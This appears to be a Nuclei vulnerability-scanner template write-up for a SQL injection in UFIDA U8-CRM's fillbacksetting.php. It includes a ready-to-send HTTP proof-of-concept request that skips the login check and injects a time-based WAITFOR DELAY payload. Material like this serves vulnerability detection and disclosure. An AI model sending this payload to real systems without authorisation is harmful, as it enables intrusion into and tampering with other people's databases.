# Nuclei Template: UFIDA U8 CRM fillbacksetting.php - SQL Injection
**Template ID:** yonyou-u8-crm-tb-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-crm-tb-sqli.yaml`)

## Vulnerability Information & PoC

## Description
UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.

## Steps to reproduce / Exploit Payload
```http
@timeout 20s
GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=bgsesstimeout-;
```

## References
- https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9Ffillbacksetting.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
